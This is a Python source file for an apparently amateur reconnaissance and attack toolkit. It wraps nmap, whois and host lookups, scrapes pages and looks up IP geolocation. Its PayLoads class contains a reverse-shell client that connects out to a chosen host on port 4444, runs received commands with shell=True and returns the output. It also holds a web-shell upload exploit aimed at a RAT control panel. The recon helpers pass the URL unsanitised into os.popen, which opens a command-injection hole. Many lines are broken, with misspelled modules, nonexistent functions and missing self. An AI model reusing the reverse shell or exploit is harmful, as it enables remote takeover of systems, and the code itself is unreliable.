import re
import os
import logging
import requests
import time
import socket
import subprocess
import sys
import time
from bs4 import BeautifulSoup
from json import loads
from prettytable import PrettyTable
from urllib.request import urlopen, urlretrieve, Request
from urllib.error import URLError
from Webcrawler import WebCrawler

colors = {
    'BLUE': '\33[1;94m',
    'RED': '\033[1;91m',
    'WHITE': '\33[1;97m',
    'YELLOW': '\33[1;93m',
    'MAGENTA': '\033[1;35m',
    'GREEN': '\033[1;32m',
    'END': '\033[0m',
}
# log file
logging.basicConfig(filename="temp.log", level=logging.DEBUG)


# Subclass of the crawler
class NetworkIntelligence(WebCrawler):
    global colors

    def __init__(self, base_url):
        # inherit superclass variable
        super().__init__(base_url)

    def network_mapper(self):
        # Do a fast NMAP scan
        logging.debug("Scan for open ports")
        command = "nmap -F " + self.base_url[8:]  # take out https://
        try:
            process = os.popen(command)
            output = str(process.read())
            # -----------------
            style = '-' * 45
            # -----------------
            print(style + " NMAP Fast Scan " + style)
            print(colors["BLUE"], output, colors["END"])
        except Exception as e:
            print(colors["RED"], "Error:   ", e, colors["END"])

    def robotsFile(self):
        # robots
        try:
            # robots.txt
            robotsReq = urlopen(self.base_url+"/robots.txt")
            robots = robotsReq # store page
            if robotsReq is not None:
                bsRobots = BeautifulSoup(robots, "lxml")
                style = ("-" * 45)
                print(style + " Robots.txt " + style)
                print(bsRobots.string)
            else:
                print("Robots.txt not found!")
        except Exception as e:
            print("Error:   ", e)

    def whoIs(self):
        # whois information [extras]
        command = "whois " + self.base_url[8:]
        process = os.popen(command)
        try:
            output = str(process.read())
            style = "-" * 45
            print(style + " Whos is info " + style)
            print(colors["BLUE"], output, colors["END"])
        except Exception as e:
            print(colors["RED"], "Error:   ", e, colors["END"])

            # getting an ip through the host service
    def getIP(self):
        command = "host {}".format(self.base_url[8:])
        process = os.popen(command)
        try:
            output = str(process.read())
            style = "-" * 45
            print(style, " IP ADDRESS OF " + self.base_url[8:], style)
            print(colors["BLUE"], output, colors["END"])
        except Exception as e:
            print(colors["RED"], "Error ", e, colors["END"])


class ScraperInfo(WebCrawler):

    global colors

    def __init__(self, base_url):
        super().__init__(base_url)

    def sourceCode(self, name='source code'):
        directory = str(os.getcwd())
        request = urlopen(self.base_url)
        # create a bs4 object, change feature to HTML.parser
        # if necessary
        bsObj = BeautifulSoup(request, "lxml")
        htmlCode = bsObj.prettify()

        file = "{}.html".format(name)
        with open(directory+file, "w") as f:
            f.write(htmlCode)
        # close
        f.close()
        print(colors["RED"], "Your file has been saved in {} as {}".format(directory, file), colors["END"])

    def HTTP_headers(self):
        request = urlopen(self.base_url)
        # HTTP headers
        TAB = "\t" * 5
        print(colors["YELLOW"],TAB, request.info(), colors["END"])


    def siteImages(self):
        links = set()
        request = urlopen(self.base_url)
        bsObj = BeautifulSoup(request, "lxml")
        for link in bsObj.find_all('a'):
            if 'src' in link.attrs:
                # image has source
                downloadURL = link.attrs['src']
                print("[+] Storing => {}".format(downloadURL))
                links.add(downloadURL)
            else:
                pass

        index = 0
        name = "{} .jpg".format(str(index))
        directory = os.getcwd()
        try:
            for link in links:
                urlretrieve(link, name)
                index += 1
        except Exception as e:
            print(colors["RED"], "Error => ", e, colors["END"])

    def commentHarvester(self):
        """Harvests comments on pages for later analysis"""
        urls = []
        url = requests.get(self.base_url)
        # look for any comment
        comments = re.find_all("<!---(.*)-->", url.text)
        print("Comments found on {}".format(self.base_url))
        for comment in comments:
            # I just like being sure
            if comment is not None:
                print(colors["BLUE"], comment, colors["END"])
            else:
                pass
        # change to HTML.parser if need be
        bsOBj = BeautifulSoup(url.text, "lxml")
        for link in bsOBj.find_all('a'):
            if 'href' in link.attrs:
                newLink = link.get('href')
                try:
                    if link.attrs[:4] == "http":
                        if url in newLink:
                            urls.append(str(newLink))
                    elif link.attrs[:1] == "/":
                        coJoint = url+newLink
                        urls.append(str(coJoint))
                except Exception as e:
                    print(colors["RED"], "Error ", e, colors["END"])
        for link in urls:
            print(colors["GREEN"], "Harvesting more links on {}".format(url), colors["END"])
            url = request.get(link)
            comments = re.find_all("<!--(.*)-->", url.text)
            for comment in comments:
                print(colors["YELLOW"], comment, colors["END"])

class IPLookUp(WebCrawler):

    global colors

    def __init__(self, ipAddress):
        self.ipAddress = ipAddress

    def getInformation(self):
        # JSON FILE using Freegeoip API

        request = urlopen("https://freegeoip.net/json/"+str(self.ipAddress))
        request = request.read().decode("utf-8")
        jsonFile = loads(request)

        region = jsonFile['region_name']
        countryCode = jsonFile['country_code']
        latitude = jsonFile['latitude']
        longitude = jsonFile['longitude']
        ipAddr = jsonFile['ip']
        zipCode = jsonFile['zip_code']
        timeZone = jsonFile['time_zone']
        countryName = jsonFile['country_name']
        city = jsonFile['city']

        table = PrettyTable()
        table.field_names = [
            "Region", "Country Code", "Latitude",
            "Longitude", "IP Address", "Zip Code",
            "Time Zone", "Country", "City"
        ]
        table.add_row(
            [
                region, countryCode, latitude,
                longitude, ipAddr, zipCode,
                timeZone, countryName, city
                ]
        )
        # align to the right
        table.align = "r"
        print(colors["MAGENTA"], table, colors["END"])

class PayLoads(WebCrawler):

    global colors
    # Under construction (Having problems debugging)

    def __init__(self, base_url, host, port=4444):
        super().__init__(base_url)
        self.host = host
        self.port = port

    def connection(self):
        sockObj = socket.socket(sockt.AF_INET, socket.SOCK_STREAM)
        sockObj.connect((self.host, port))

        return sockObj

    def await(sockObj):
        data = sockObj.recv(2048)

        if data == "exit\n":
            sockObj.close()
            sys.exit()
        # nothing
        elif len(data) == 0:
            return True
        else:
            process = subprocess.Popen(
                                    data, shell=True,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE
                                    )
            stdout = process.stdout.read() + process.stderr.read()
            sockObj.send(stdout)
            return False

    def run(self):
        while True:
            dead = False
            try:
                sockObj = connection((self.host, self.port))
                while not dead:
                    dead = await(sockObj)
                sockObj.close()
            except Exception as e:
                print(colors["RED"], "Error ", e, colors["END"])

    # TorCT RAT C&C Panel Shell Upload Exploit
    # Credits -->  Darren Martyn
    def upload_shell(url, shell="/your/shell.php"):
        try:
            files = {
            'file': open(shell, "rb")
            }

            req = requests.post(url=url, files=files)
        except Exception as e:
            print(colors["RED"], "---\t FAILED \t---", colors["END"])
            print("Error ", e)

        if "File is successfully stored!" in req.text:
            print(colors["GREEN"], "[+] Shell Uploaded!", colors["END"])
            print(colors["MAGENTA"], "It should be in {}".format(url.replace("upload.php", "Upload/%s"%(os.path.basename(shell)))), colors["END"])
        else:
            sys.exit()



class Ping(WebCrawler):

    # Facing a few issues, still got problems
    global colors

    def __init__(self, ipAddr):
        self.ipAddr = ipAddr

    def pingScan():
        print(colors["BLUE"], "Scanning {}".format(self.ipAddr), colors["END"])

        process = subprocess.Popen(["/bin/ping", "-c 1 ", self.ipAddr], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=PIPE)
        stdout, stderr = subprocess.communicate(input=None)

        if "bytes from " in stdout:
            print(colors["YELLOW"], "The IP Address {} has responded with an Echo Reply".format(stdout.split()[1]), colors["END"])
        else:
            print(colors["RED"], "No Echo Response!", colors["END"])
            sys.exit()
